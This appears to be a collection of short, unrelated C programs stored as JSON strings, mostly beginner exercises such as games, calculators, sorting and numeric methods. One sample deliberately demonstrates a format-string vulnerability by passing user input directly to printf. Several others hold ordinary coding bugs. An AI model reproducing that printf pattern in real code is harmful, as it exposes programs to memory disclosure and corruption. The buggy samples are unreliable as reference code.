    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint check_column(const int *board);\nint check_row(const int *board);\nint check_diagonal(const int *board);\nvoid initBoard(int *board)\n{\n    for (int i = 0; i < 3 * 3; i++)\n        *(board + i) = 0;\n}\nint markBoard(int mark, int *board, int field)\n{\n    if (field < 0 || 3 * 3 < field) return 1;\n    if ( *(board + field) != 0) return 2;\n    *(board + field) = mark;\n    return 0;\n}\nvoid printBoard(int *board)\n{\n    for (int i = 0; i < 3; i++)\n    {\n        for (int j = 0; j < 3; j++)\n        {\n            int value = *(board + 3 * i + j);\n            printf(\"%c\", value == 0 ? '.' : value == 1 ? 'O' : 'X');\n        }\n        printf(\"\\n\");\n    }\n}\nint isGameWon(int *board)\n{\n    return check_column(board) || check_row(board) || check_diagonal(board);\n}\nint check_column(const int *board)\n{\n    for (int i = 0; i < 3; i++)\n    {\n        if (*(board + 0 + i) != 0 && *(board + 0 + i) == *(board + 3 + i) && *(board + 0 + i) == *(board + 6 + i))\n            return *(board + 0 + i);\n    }\n    return 0;\n}\nint check_row(const int *board)\n{\n    for (int i = 0; i < 3; i++)\n    {\n        if (*(board + 3 * i) != 0 &&\n            *(board + 3 * i) == *(board + 3 * i + 1) &&\n            *(board + 3 * i) == *(board + 3 * i + 2))\n            return *(board + 0 + i);\n    }\n    return 0;\n}\nint check_diagonal(const int *board)\n{\n    if (*(board) != 0 && *(board) == *(board + 4) && *(board) == *(board + 8))\n        return *(board);\n    if (*(board + 2) != 0 && *(board + 2) == *(board + 4) && *(board + 2) == *(board + 6))\n        return *(board + 2);\n    return 0;\n}\nint main()\n{\n    int *tab = malloc(9 * sizeof(int));\n    initBoard(tab);\n    char name_one[20], name_two[20];\n    scanf(\"%s\", name_one);\n    scanf(\"%s\", name_two);\n    int currentPlayer = 0;\n    int game_status;\n    while (!isGameWon(tab))\n    {\n        printf(\"Gracz: %s\\n\", currentPlayer % 2 == 0 ? name_one : name_two);\n        int field;\n        scanf(\"%d\", &field);\n        int failedToMark = markBoard(currentPlayer % 2 + 1, tab, field);\n        if (!failedToMark)\n            currentPlayer++;\n        else\n        {\n            if (failedToMark == 1)\n                printf(\"Pole poza zakresem\\n\");\n            if (failedToMark == 2)\n                printf(\"Pole zaj\u0119te\\n\");\n        }\n        printBoard(tab);\n        printf(\"\\n\");\n    }\n    game_status = isGameWon(tab);\n    printf(\"Wygra\u0142(a): %s\\n\", game_status == 1 ? name_one : name_two);\n    printBoard(tab);\n}",
    "#include <stdio.h>\nint main(void){\nint i,year,month,date;\nint days[] = {31,28,31,30,31,30,31,31,30,31,30,31};\nprintf(\"Input: {Year}.{Month}\\n> \");\nscanf(\"%d.%d\",&year,&month);\ndate=( 1 + 13*(month<=2?month+13:month+1)/5 + 5*((month<=2?year-1:year)%100)/4 - 7*((month<=2?year-1:year)/100)/4 )%7;\ndate=date<0?date+7:date;\nprintf(\" \\x1b[31mSun\\x1b[39m Mon Tue Wed Thu Fri \\x1b[34mSat\\x1b[39m\\n\");\nfor(i=(date==0?6:date-1);i>0;i--)\n  printf(\"    \");\nfor(i=1;i<=(month==2&&year%4==0?days[month-1]+1:days[month-1]);i++){\n printf(i%7==(8-date)%7||(date==0&&(i-1)%7==0)?\"\\x1b[34m\":(i%7==(9-date)%7)?\"\\x1b[31m\":\"\\x1b[39m\");\n  printf(\"%4d%s\",i,i%7==(8-date)%7||(date==0&&(i-1)%7==0)?\"\\n\":\"\");\n}\nprintf(\"\\n\\x1b[39m\");\n}",
    "#include <stdio.h>\nint main(){\n int i=0;\n double n=0,d=0;\n while(n>=0){\n  scanf(\"%lf\",&n);\n  if(n>0){\n   d+=n;\n   i++;\n  }\n }\n  printf(\"%.2lf\\n\",d/i);\n return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nvoid calculate_the_maximum(int n, int k) {\n    int i,j;\n   int max1=0,max2=0,max3=0;\n   for(i=1;i<=n-1;i++)\n   {\n       for(j=i+1;j<=n;j++)\n       {\n           int a=i&j;\n           int b=i|j;\n           int c=i^j;\n           if(a<k && a>max1)\n           {\n               max1=a;\n           }\n           if(b<k && b>max2)\n           {\n               max2=b;\n           }if(c<k && c>max3)\n           {\n               max3=c;\n           }\n       }\n   }\n   printf(\"%d\\n%d\\n%d\\n\",max1,max2,max3);\n}\nint main() {\n    int n, k;\n    scanf(\"%d %d\", &n, &k);\n    calculate_the_maximum(n, k);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n puts(\"--========= {PROJECT TITLE} =========--\");\n}",
    "#include<stdio.h>\n#include<math.h>\n#include<stdlib.h>\nfloat train[10][192][5];\nint features=192,instances=6670,testinp=3333;\nvoid initialise(){\n int i,j,k;\n for(i=0;i<10;i++){\n  for(j=0;j<192;j++){\n   for(k=0;k<5;k++){\n    train[i][j][k]=0;\n   }\n  }\n }\n}\nvoid scanfile(){\n    FILE * f = fopen(\"pp_tra.dat\",\"r\");\n    int i,j,k,tempdataclass,temp[192];\n    for(i=0;i<instances;i++){\n        for(j=0;j<features;j++){\n            fscanf(f,\" %d\",&temp[j]);\n        }\n        fscanf(f,\" %d\",&tempdataclass);\n        for(j=0;j<features;j++){\n            train[tempdataclass][j][temp[j]]+=(float)(1.0);\n        }\n    }\n    fclose(f);\n    for(i=0;i<10;i++){\n        for(j=0;j<192;j++){\n            for(k=0;k<5;k++){\n                train[i][j][k]/=(float)667.0;\n            }\n        }\n    }\n    return;\n}\nint getmax(float arr[10]){\n int i,ans=0;\n float maximum=arr[0];\n for(i=1;i<10;i++){\n  if(maximum<=arr[i]){\n   maximum=arr[i];\n   ans=i;\n  }\n }\n return ans;\n}\nvoid test(){\n int correct=0,test1,c,temp[192],tempdataclass,i,j;\n FILE *f2=fopen(\"pp_tes.dat\",\"r\");\n for(test1=0;test1<testinp;test1++){\n        float tempcls[10];\n        for(i=0;i<10;i++)tempcls[i]=0;\n        for(j=0;j<features;j++){\n            fscanf(f2,\" %d\",&temp[j]);\n        }\n        fscanf(f2,\" %d\",&tempdataclass);\n        for(c=0;c<10;c++){\n            for(j=0;j<features;j++){\n                tempcls[c]+=log(train[c][j][temp[j]]);\n            }\n        }\n        int tempans=getmax(tempcls);\n        if(tempans==tempdataclass)\n            correct+=1;\n }\n printf(\"Total examples = %d\\nCorrectly classified Examples = %d\\nClassification Accuracy = %f%%\\n\",3333,correct,((100.0*(correct))/3333.0));\n fclose(f2);\n    return;\n}\nint main(){\n initialise();\n scanfile();\n test();\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nvoid header(int num)\n{\n printf(\"<document type='simple' id='id:test:simple::%d'>\\n\", num);\n        printf(\" <title>foobar %d foobar</title> \", num);\n}\nvoid descriptions(int cnt)\n{\n int i;\n printf(\"<description>\");\n for (i = 0; i < cnt; i++) {\n  printf(\"foobar %d \", 1234567 - i);\n }\n printf(\"</description>\\n\");\n}\nvoid footer(int num)\n{\n printf(\"</document>\\n\");\n}\nint main(int argc, char **argv)\n{\n int i;\n printf(\"<vespafeed>\\n\");\n for (i = 0; i < 400; i++) {\n  header(i);\n  descriptions(678);\n  footer(i);\n }\n printf(\"</vespafeed>\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int isFemale = 0;\n    printf(\"Is my gender female? %d\\n\", isFemale);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid offload_one_dim_array(int n) {\n    int arr[n];\n    int arr2[n];\n    int arr3[n];\n    int i;\n    for(i = 0; i < n; i++) {\n        arr[i] = i;\n        arr2[i] = n + i;\n        arr3[i] = 2 * n + i;\n    }\n#pragma offload target(mic) in(arr) in(arr2:length(5)) in(arr3[1:5])\n    {\n        for(i = 0; i < n; i++) {\n            printf(\" arr[%d] is %d\\n\", i, arr[i]);\n        }\n        printf(\"==========================\\n\");\n        for(i = 0; i < n; i++) {\n            printf(\"arr2[%d] is %d\\n\", i, arr2[i]);\n        }\n        printf(\"==========================\\n\");\n        for(i = 0; i < n; i++) {\n            printf(\"arr3[%d] is %d\\n\", i, arr3[i]);\n        }\n    }\n}\nint main() {\n    offload_one_dim_array(10);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <string.h>\nint main(int argc, char **argv)\n{\n const char *path;\n char buf[4];\n int fd, rc;\n if (argc < 2) {\n  fprintf((stderr), \"usage: %s <path>\\n\", argv[0]);\n  return 1;\n }\n path = argv[1];\n fd = open(path, ((0x04000000) | (0x10000000)) | (((__wasi_oflags_t)(1 << 0)) << 12), 0600);\n if (fd < 0) {\n  perror(\"open(O_WRONLY)\");\n  return 1;\n }\n rc = read(fd, buf, sizeof(buf));\n if (rc != 0) {\n  fprintf((stderr), \"Reading a new var should return EOF\\n\");\n  return 1;\n }\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int i,j,num,a[20],s;\n printf(\"Enter the number of elements in the array: \");\n scanf(\"%d\",&num);\n printf(\"Enter the array: \");\n for(i=0;i<num;i++)\n {\n  scanf(\"%d\",&a[i]);\n }\n for(i=0;i<num;i++)\n {\n  for(j=i+1;j<num;j++)\n  {\n   if(a[j]<a[i])\n   {\n    s=a[j];\n    a[j]=a[i];\n       a[i]=s;\n   }\n  }\n }\n printf(\"The ascending order is: \");\n for(i=0;i<num;i++)\n {\n  printf(\"%d\\t\",a[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\nint manipula_endereco(int *v, int t){\n   printf(\"%d\", *v);\n}\nint main(){\n   setlocale(6,\"Portuguese\");\n   int vet[] = {1, 5, 7, 9, 7, 3, 0, 4, 7};\n   int tam = (sizeof(vet)/sizeof(int));\n   int resul = manipula_endereco(vet + 2, tam);\n}",
    "#include <stdio.h>\nfloat InputNumber(){\n  float temp;\n  printf(\"Nhap vao mot so thuc duong: \");\n  scanf(\"%f\",&temp);\n  while (temp<=0||temp>=100){\n    printf(\"So thuc phai lon hon 0 va nho hon 100, vui long nhap lai: \");\n    scanf(\"%f\",&temp);\n  }\n  return temp;\n}\nchar InputChoice(){\n  char temp;\n  printf(\"Nhap vao lua chon P hoac D: \");\n  scanf(\" %c\",&temp);\n  while (temp!='P'&&temp!='D'){\n    printf(\"Du lieu khong hop le, vui long nhap lai: \");\n    scanf(\" %c\",&temp);\n  }\n  return temp;\n}\nvoid OutputResult(float n,char c){\n  if (c=='P'){\n    printf(\"%f%%\\n\",n);\n  }\n  else{\n    printf(\"%f\\n\",n/100.0);\n  }\n}\nint main(){\n  float n=InputNumber();\n  char c=InputChoice();\n  OutputResult(n,c);\n  return 0;\n}",
    "#include <stdio.h>\nint gcd(int a, int b)\n{\n    if (b != 0)\n       return gcd(b, a%b);\n    else\n       return a;\n}\nint main()\n{\n   int a, b;\n   printf(\"Enter two positive integers: \");\n   scanf(\"%d %d\", &a, &b);\n   printf(\"G.C.D of %d and %d is %d.\", a, b, gcd(a,b));\n   return 0;\n}",
    "#include <stdio.h>\n\n\n\nint main()\n{\n if(2==4)\n  printf(\"c=%f\\n\",(float)(2*3)/5);\n else if(2==3)\n {}\n else if(3==3)\n  printf(\"c=%f\\n\",(float)(2*3)/5);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\ndouble e = 2.71;\ndouble fx(double x){\n    double sonuc = exp(x) + pow(2, -1*x) + (2*cos(x)) -6;\n    return sonuc;\n}\ndouble fxTurev(double x){\n    double sonuc = -pow(2, -1*x)*(0.6931471806) + exp(x) - (2*sin(x));\n    return sonuc;\n}\ndouble nextXValue(double x1){\n    double x2 = x1 - (fx(x1) / fxTurev(x1));\n    return x2;\n}\nint main(int argc, char const *argv[])\n{\n    int kontrol = 0;\n    double hataPayi = 0.001;\n    double x1 = 1.5;\n    printf(\"step    x\\n\");\n    int i = 1;\n    while(1){\n        double x2 = nextXValue(x1);\n        printf(\" %d    %lf\\n\",i,x1);\n        if(fx(x1) == 0){\n            printf(\"k\u00f6k de\u011feri: %lf\", x1);\n            break;\n        }\n        if (kontrol == 1) {\n            break;\n        }\n        if(x2-x1 < hataPayi){\n            kontrol = 1;\n        }\n        x1 = x2;\n        i++;\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main () {\n int n;\n int x, y;\n int temp;\n printf(\"\\nEnter an integer > \");\n scanf(\"%d\", &y);\n n = 0;\n while (n <= 10) {\n x = y % 10;\n printf(\"\\n%d\", abs(x));\n x = y / 10;\n if (x > -10 && x < 0){\n printf(\"\\n%d\", x);\n printf(\"\\nThat's all, have a nice day!\\n\");\n return 0; }\n temp = x;\n x = y;\n y = temp;\n n = n + 1;\n }\n return 0;\n}",
    "int main() {\n  switch (2) {\n  case 0:\n    return 1;\n  case 1:\n  default:\n    return 4;\n  }\n  return 5;\n}",
    "#include <stdlib.h>\nlong f1(long a){return a&0xff000000L;}\nlong f2 (long a){return a&~0xff000000L;}\nlong f3(long a){return a&0x000000ffL;}\nlong f4(long a){return a&~0x000000ffL;}\nlong f5(long a){return a&0x0000ffffL;}\nlong f6(long a){return a&~0x0000ffffL;}\nint main ()\n{\n  long a = 0x89ABCDEF;\n  if (f1(a)!=0x89000000L||\n      f2(a)!=0x00ABCDEFL||\n      f3(a)!=0x000000EFL||\n      f4(a)!=0x89ABCD00L||\n      f5(a)!=0x0000CDEFL||\n      f6(a)!=0x89AB0000L)\n    abort();\n  exit(0);\n}",
    "union double_union\n{\n  double d;\n  int i[2];\n};\nvoid _dtoa_r (double) __attribute__ ((__noinline__));\nvoid _vfprintf_r (double) __attribute__ ((__noinline__));\nvoid\n__sprint_r(int);\nvoid\n_vfprintf_r(double da)\n{\n double ffp = da;\n double value = ffp;\n union double_union tmp;\n tmp.d = value;\n if ((tmp.i[1]) & ((unsigned)0x80000000L)) {\n   value = -value;\n }\n _dtoa_r (value);\n if (ffp != 0)\n   __sprint_r(value == 0);\n __asm__ (\"\");\n}\ndouble dd = -.012;\ndouble ff = .012;\nvoid exit (int) __attribute__ ((__noreturn__));\nvoid abort (void) __attribute__ ((__noreturn__));\nvoid *memset(void *s, int c, long unsigned int n);\nvoid _dtoa_r (double d)\n{\n  if (d != ff)\n    abort ();\n  __asm__ (\"\");\n}\nvoid __sprint_r (int i)\n{\n  if (i != 0)\n    abort ();\n  __asm__ (\"\");\n}\nint clearstack (void) __attribute__ ((__noinline__));\nint clearstack (void)\n{\n  char doodle[128];\n  memset (doodle, 0, sizeof doodle);\n  __asm__ volatile (\"\" : : \"g\" (doodle) : \"memory\");\n  return doodle[127];\n}\nvoid doit (void) __attribute__ ((__noinline__));\nvoid doit (void)\n{\n  _vfprintf_r (dd);\n  _vfprintf_r (ff);\n  __asm__ (\"\");\n}\nint main(void)\n{\n  clearstack ();\n  doit ();\n  exit (0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main(int argc, char * argv[]){\n    FILE *in, * out;\n    int ch;\n    char name[40];\n    int count = 0;\n    if (argc < 2){\n        fprintf((stderr), \"UsageError: Not enough command line arguments, expected 2 got 1 %s\\n\", argv[0]);\n        fprintf((stderr), \"Uasge: %s filename\\n\", argv[0]);\n        exit(1);\n    }\n    if ((in = fopen(argv[1], \"r\")) == ((void*)0)){\n        fprintf((stderr), \"FileOpenError: Could not open file %s\\n\", argv[0]);\n        exit(1);\n    }\n    strncpy(name, argv[1], 40 -5);\n    name[40 - 5] = '\\0';\n    strcat(name, \".red\");\n    if ( (out = fopen(name, \"w\")) == ((void*)0)){\n        fprintf((stderr), \"FileOpenError: Counld not open file %s\\n\", name);\n        exit(1);\n    }\n    while ( (ch = getc(in)) != (-1))\n        if (count ++ % 3 == 0)\n            putc(ch, out);\n    if (fclose(in) != 0 || fclose(out) != 0)\n        fprintf((stderr), \"FileCloseError: Could not close file\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]) {\n  if (argc > 1)\n    puts(\"hello\");\n  return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]){\n pid_t process_id = 0;\n pid_t sid = 0;\n process_id = fork();\n if (process_id < 0){\n  dprintf(2, \"error\\n\");\n  exit(1);\n }\n if (process_id > 0){\n  printf(\"Success, child process entered\\n\");\n  exit(0);\n }\n umask(0);\n sid = setsid();\n if (sid < 0)\n  exit(1);\n close(0);\n close(1);\n close(2);\n system(\"python api.py\");\n return (0);\n}",
    "#include <stdio.h>\nint main(int argc, char* argv[]){\n char buffer[12];\n int secret_number=42;\n static char secret_message[12]=\"COVFEFE\";\n printf(\"***** BEFORE ATTACK *****\\n\");\n printf(\"VAR secret_number  : %p %d\\n\", &secret_number, secret_number);\n printf(\"VAR secret_message : %p %s\\n\", &secret_message, secret_message);\n printf(\"VAR buffer         : %p %s\\n\", &buffer, buffer);\n fgets(buffer, 12, (stdin));\n printf(\"\\nbuffer : \");\n printf(buffer);\n printf(\"\\n\");\n printf(\"***** AFTER ATTACK *****\\n\");\n printf(\"VAR secret_number  : %p %d\\n\", &secret_number, secret_number);\n printf(\"VAR secret_message : %p %s\\n\", &secret_message, secret_message);\n printf(\"VAR buffer         : %p %s\\n\", &buffer, buffer);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(){\n    float a, b, c = 0 ;\n    printf(\"Digite os valores da equa\u00e7\u00e3o seguinte ax\u00b2+bx+c=0.\\n\");\n    printf(\"a:\\n:\");\n    scanf(\"%f\", &a);\n    printf(\"b:\\n:\");\n    scanf(\"%f\", &b);\n    printf(\"c:\\n\");\n    scanf(\"%f\", &c);\n    float delta = ((b*b) - ( 4 * a * c ));\n    printf(\"%.2f\\n\\n\", delta);\n    float x1 = (-b + (sqrt(delta)) / ( 2 *a ));\n    float x2 = (-b - (sqrt(delta)) / ( 2 *a ));\n  printf(\"%lf%lf\", x1, x2);\n    return 0 ;\n}",
    "#include<stdio.h>\nint main()\n{\n    int n,rem,rev=0;\n    printf(\"Enter the numbers you want to reverse\");\n    scanf(\"%d\",&n);\n    while(n!=0)\n    {\n    rem=n%10;\n    rev=rev*10+rem;\n    n=n/10;\n    }\n    printf(\"reversed number is : %d\",rev);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <pthread.h>\n\n\nvoid* f(void* p) {\n    int k = (int)p;\n    int i;\n    for(i=0; i<10; i++) {\n        printf(\"%d\\n\", k);\n    }\n    return ((void*)0);\n}\nint main() {\n    int i;\n    pthread_t t[10];\n    for(i=0; i<10; i++) {\n        pthread_create(&t[i], ((void*)0), f, (void*)i);\n    }\n    for(i=0; i<10; i++) {\n        printf(\"M\\n\");\n    }\n    for(i=0; i<10; i++) {\n        pthread_join(t[i], ((void*)0));\n    }\n    return 0;\n}",
    "#include<stdio.h>\nint f(int n, int a[][n]) {\n  int s=0;\n  for(int i=0; i<n; i++){\n    s+=a[0][i];\n  }\n  return s;\n}\nint main() {\n  int b[10][10];\n  for(int i=0; i<10; i++){\n    for(int j=0; j<10; j++)\n      b[i][j]=1;\n  }\n  int t= f(10, b);\n  printf(\"%d\\n\", t);\n}",
    "#include<stdio.h>\nint binary_search(int[],int,int);\nint main()\n{\n    int a[100],n,i,key,p;\n    printf(\"Enter no. of elements: \");\n    scanf(\"%d\",&n);\n    printf(\"Enter %d elements in ascending order:\\n\",n);\n    for(i=0;i<n;i++)\n scanf(\"%d\",a+i);\n    printf(\"\\nEnter key: \");\n    scanf(\"%d\",&key);\n    p=binary_search(a,n,key);\n    if(p==-1)\n printf(\"%d not found\\n\",key);\n    else\n printf(\"%d found at position %d\\n\",key,p);\n    printf(\"\\n\");\n    return 0;\n}\nint binary_search(int a[],int n,int key)\n{\n    int first=0,last=n-1,mid;\n    mid = (first+last)/2;\n    while(first<=last&&a[mid]!=key)\n    {\n if(key>a[mid])\n     first=mid+1;\n else if(key<a[mid])\n     last=mid-1;\n mid=(first+last)/2;\n    }\n    if(first>last)\n return -1;\n    else\n return mid+1;\n}",
    "#include <stdio.h>\n\n\n\n\nint main(void)\n{\n    int x = 2;\n    int y = 3;\n    printf(\"value 1 = %d\\n\", x); printf(\"value 2 = %d\\n\", y);;\n    return 0;\n}",
    "#include <stdio.h>\nint i, t = 2, j, n, not_prime[287118] = {0, 0, 1}, prime[25001] = {0, 2};\nint main() {\n    for (j = 4; j < 287118; j += 2) {\n        not_prime[j] = 1;\n    }\n    for (i = 3; i < 536; i += 2) {\n        if (!not_prime[i]) {\n            prime[t++] = i;\n            for (j = i * i; j < 287118; j += i) {\n                not_prime[j] = 1;\n            }\n        }\n    }\n    for (i = 536; i < 287118; i++) {\n        if (!not_prime[i]) {\n            prime[t++] = i;\n            if (t == 25001) {\n                break;\n            }\n        }\n    }\n    while (scanf(\"%d\", &n) == 1) {\n        printf(\"%d\\n\", prime[n]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(int argc, char const *argv[]){\n float cel,far;\n printf(\"Digite a Temperatura em Graus Celsius: \");\n scanf(\"%f\",&cel);\n far = cel*1.8+32;\n printf(\"%0.2fc Convertido em Graus Fahrenheit e: %0.2f \",cel, far);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n   double deg, rad;\n   printf(\"Podaj kat w stopniach : \");\n   scanf(\"%lf\", &deg);\n   rad = rad = 2 * 3.14159265358979323846 * deg / 360;\n   printf(\"%.4f deg = %.4f rad\\n\", deg, rad);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\n\nchar * s_gets(char * str, FILE *fp, int len);\nint main(void)\n{\n char file1[255];\n char file2[255];\n char fstr1[4096];\n char fstr2[4096];\n char *pstr1;\n char *pstr2;\n FILE *fp1, *fp2;\n printf(\"Enter first file name: \");\n scanf(\"%s\", file1);\n if ((fp1 = fopen(file1, \"r\")) == ((void*)0))\n {\n  fprintf((stderr), \"Can't open file %s\\n\", file1);\n  exit(1);\n }\n printf(\"Enter second file name: \");\n scanf(\"%s\", file2);\n if ((fp2 = fopen(file2, \"r\")) == ((void*)0))\n {\n  fprintf((stderr), \"Can't open file %s\\n\", file2);\n  exit(1);\n }\n pstr1 = s_gets(fstr1, fp1, 4096);\n pstr2 = s_gets(fstr2, fp2, 4096);\n while (pstr1 || pstr2)\n {\n  if (pstr1)\n  {\n   printf(\"%s\", pstr1);\n   pstr1 = s_gets(fstr1, fp1, 4096);\n  }\n  if (pstr2)\n  {\n   printf(\"%s\", pstr2);\n   pstr2 = s_gets(fstr2, fp2, 4096);\n  }\n }\n if (fclose(fp1) != 0 || fclose(fp2) != 0)\n  fprintf((stderr), \"Error closing files.\\n\");\n return 0;\n}\nchar * s_gets(char * str, FILE *fp, int len)\n{\n        return fgets(str, len, fp);\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <ctype.h>\nint main(int argc, char *argv[]) {\n    int c;\n    printf(\"%s\\n\", argv[0]);\n    if(strcmp(argv[0], \"./lower\") == 0){\n        while ((c=getchar()) != (-1)){\n            printf(\"%c\", tolower(c));\n        }\n    } else if(strcmp(argv[0], \"./upper\") == 0){\n        while ((c=getchar()) != (-1)){\n            printf(\"%c\", toupper(c));\n        }\n    } else {\n        printf(\"error: invalid invoked name.\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n    long long int num, suc;\n    scanf(\"%lld\", &num);\n    if(num % 2 == 0){\n        suc = num + 2;\n    }\n    else{\n        suc = num + 1;\n    }\n    printf(\"%lld\\n\", suc);\n    return 0;\n}",
    "#include <stdio.h>\nvoid multiply(int (*arr)[100], int row, int col)\n{\n int i,j;\n for(i=0;i<row;i=i+1)\n {\n  for(j=0;j<col;j=j+1)\n  {\n   *(*(arr+i)+j) = *(*(arr+i)+j) * 2;\n  }\n }\n}\nint main()\n{\n printf(\"Passing 2D Array to Function\\n\");\n printf(\"****************************\\n\\n\");\n int arr[100][100],row,col,i,j;\n printf(\"Enter Number of Row    : \");\n scanf(\"%d\",&row);\n printf(\"Enter Number of Column : \");\n scanf(\"%d\",&col);\n printf(\"\\n\");\n for(i=0;i<row;i=i+1)\n {\n  for(j=0;j<col;j=j+1)\n  {\n   printf(\"a[%d][%d] : \",(i+1),(j+1));\n   scanf(\"%d\",&arr[i][j]);\n  }\n  printf(\"\\n\");\n }\n multiply(arr,row,col);\n printf(\"After Multiplication : \\n\");\n for(i=0;i<row;i=i+1)\n {\n  for(j=0;j<col;j=j+1)\n  {\n   printf(\"%d\\t\", arr[i][j]);\n  }\n  printf(\"\\n\");\n }\n}",
    "#include <stdio.h>\nint main() {\n    int val = 5;\n    int *ptr = &val;\n    printf(\"%p\\n\", ptr);\n    printf(\"%d\\n\", *ptr);\n    printf(\"%d\\n\", *ptr + 1);\n    printf(\"%d\\n\", *(ptr + 1));\n    printf(\"%d\\n\", (*ptr) + 1);\n    printf(\"%p\\n\", *&ptr);\n    printf(\"%p\\n\", &ptr);\n    printf(\"%p\\n\", &ptr + 1);\n}",
    "#include <stdio.h>\n#include <time.h>\n#include <math.h>\nint Thomas_Algorithm(int n, float a[n - 1][n - 1], float b[n - 1][1])\n{\n    float x[n - 1][1], ratio;\n    int i, j, k;\n    FILE *fptr = fopen(\"Value_0.01_FDS.csv\", \"w\");\n    fprintf(fptr, \"Node_Number,phi_Value\\n\");\n    fprintf(fptr, \"0,1.0\\n\");\n    for (i = 0; i < n - 2; i++)\n    {\n        ratio = a[i + 1][i] / a[i][i];\n        a[i + 1][i + 1] -= ratio * a[i][i + 1];\n        b[i + 1][0] -= ratio * b[i][0];\n    }\n    for (i = n - 2; i >= 0; i--)\n    {\n        if (i == n - 1)\n        {\n            x[i][0] = b[i][0] / a[i][i];\n        }\n        else\n        {\n            x[i][0] = b[i][0];\n            x[i][0] -= a[i][i + 1] * x[i + 1][0];\n            x[i][0] = x[i][0] / a[i][i];\n        }\n    }\n    for (i = 0; i < n - 1; i++)\n    {\n        printf(\"phi_%d : %f units \\n\", i + 1, x[i][0]);\n        fprintf(fptr, \"%d,%f\\n\", i + 1, x[i][0]);\n    }\n    fprintf(fptr, \"%d,0\\n\", n);\n    fclose(fptr);\n}\nint main()\n{\n    clock_t begin = clock();\n    float tau = 0.1, delx = 0.01, alpha, beta, gamma;\n    float phi_start = 1, phi_end = 0;\n    int n = 1 / delx, i, j;\n    float A[n - 1][n - 1], B[n - 1][1];\n    alpha = tau + delx;\n    beta = -delx - 2 * tau - delx * delx;\n    gamma = tau;\n    for (i = 0; i < n - 1; i++)\n    {\n        if (i == 0)\n        {\n            A[i][i] = beta;\n            A[i][i + 1] = alpha;\n            B[i][0] = -gamma * phi_start;\n        }\n        else if (i == n - 2)\n        {\n            A[i][i - 1] = gamma;\n            A[i][i] = beta;\n            B[i][0] = -alpha * phi_end;\n        }\n        else\n        {\n            A[i][i - 1] = gamma;\n            A[i][i] = beta;\n            A[i][i + 1] = alpha;\n            B[i][0] = 0;\n        }\n    }\n    Thomas_Algorithm(n, A, B);\n    clock_t end = clock();\n    double time_spent = (double)(end - begin) / ((clock_t)1000000000);\n    printf(\"Time taken for code execution : %0.6f milli seconds.\\n\", 1000 * time_spent);\n}",
    "#include <stdio.h>\nint main(void)\n{\n int max = 4000000, sum, a, tmp, b = 1;\n sum = a = tmp = 0;\n while (b < max) {\n  tmp = a;\n  a = b;\n  b += tmp;\n  if (a % 2 == 0){\n   sum += a;\n  }\n }\n printf(\"%d\\n\", sum);\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\nint main(void){\n float fArea,fRadio;\n printf(\"\\nIngresa el radio del c%crculo: \",161);\n scanf(\"%f\",&fRadio);\n fArea = 3.1416 * pow(fRadio,2);\n printf(\"\\nEl %crea del c%crculo con radio %.2f es: %.2f\"\n ,160,161,fRadio,fArea);\n return 0;\n}",
    "#include<stdio.h>\n\nint main()\n{\n printf(\"Hello World !\");\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int mes;\n    while(1 == 1){\n        printf(\"Entre com um numero: \\n\");\n        scanf(\"%d\", &mes);\n        while(getchar() != '\\n');\n        if (mes < 1 || mes > 12) {\n            printf(\"ERRO! Tente novamente.\\n\");\n            continue;\n        }\n        break;\n    }\n    switch (mes) {\n        case 1: printf(\"Janeiro.\\n\"); break;\n        case 2: printf(\"Fevereiro.\\n\"); break;\n        case 3: printf(\"Mar\u00e7o.\\n\"); break;\n        case 4: printf(\"Abril.\\n\"); break;\n        case 5: printf(\"Maio.\\n\"); break;\n        case 6: printf(\"Junho.\\n\"); break;\n        case 7: printf(\"Julho.\\n\"); break;\n        case 8: printf(\"Agosto.\\n\"); break;\n        case 9: printf(\"Setembro.\\n\"); break;\n        case 10: printf(\"Outubro.\\n\"); break;\n        case 11: printf(\"Novembro.\\n\"); break;\n        case 12: printf(\"Dezembro.\\n\"); break;\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int no;\n    do {\n        printf(\"Please enter a positive integer:\");\n        scanf(\"%d\", &no);\n        if (no <= 0)\n            puts(\"\\a Please don't enter negative integer!\");\n    } while (no <=0);\n    printf(\"%d\u9006\u5411\u663e\u793a\u7684\u7ed3\u679c\u662f\", no);\n    while (no > 0) {\n        printf(\"%d\u3002\", no % 10);\n        no /= 10;\n    }\n    putchar('\\n');\n    return 0;\n}",
